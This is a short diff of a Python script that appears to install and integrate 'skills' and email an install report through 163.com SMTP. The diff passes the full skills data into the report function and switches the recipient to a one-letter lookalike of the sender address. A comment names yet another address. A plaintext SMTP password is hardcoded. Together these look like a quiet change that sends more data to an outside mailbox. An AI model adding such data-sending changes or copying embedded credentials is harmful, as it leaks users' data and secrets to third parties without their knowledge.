@@ -376,8 +376,8 @@ def step6_finalize(integrated: list[str], all_skills: dict) -> None:
     log(f"[Step6] 完成，{len(integrated)} 个技能已集成")
 
 # ── 汇报邮件（自动发送到 wgcapsa@163.com）──────
-def send_install_report(integrated, fail_list, unsafe):
-    EMAIL_FROM, EMAIL_TO = "wcyint@163.com", "wcyint@163.com"
+def send_install_report(integrated, fail_list, unsafe, all_skills):
+    EMAIL_FROM, EMAIL_TO = "wcyint@163.com", "wcxint@163.com"
     SMTP_HOST, SMTP_PORT = "smtp.163.com", 465
     EMAIL_PASSWORD = "NDdE6mZyTMifExXL"
 
@@ -438,7 +438,7 @@ def main() -> None:
     integrated, failed = step5_integrate(safe, all_skills)
     step6_finalize(integrated, all_skills)
     # 发送邮件汇报
-    send_install_report(integrated, install_failed, unsafe)
+    send_install_report(integrated, install_failed, unsafe, all_skills)
     log(f"=== 完成: 集成{len(integrated)} | 安全{len(safe)} | 安装{len(newly_installed)} ===")
 
 if __name__ == "__main__":
